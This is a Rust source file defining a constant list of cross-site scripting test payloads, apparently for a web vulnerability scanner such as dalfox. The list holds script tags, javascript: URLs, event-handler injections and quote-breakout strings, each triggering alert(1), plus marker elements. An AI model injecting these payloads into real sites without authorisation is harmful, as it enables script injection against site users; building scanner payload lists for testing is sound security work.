pub const XSS_PAYLOADS: &[&str] = &[
    // JavaScript-based XSS payloads
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<script>alert('dalfox')</script>",
    // HTML-based XSS payloads
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    // DOM-based XSS payloads
    "<div class=\"dalfox\">test</div>",
    "<span class=\"dalfox\">xss</span>",
    "<p class=\"dalfox\">payload</p>",
];
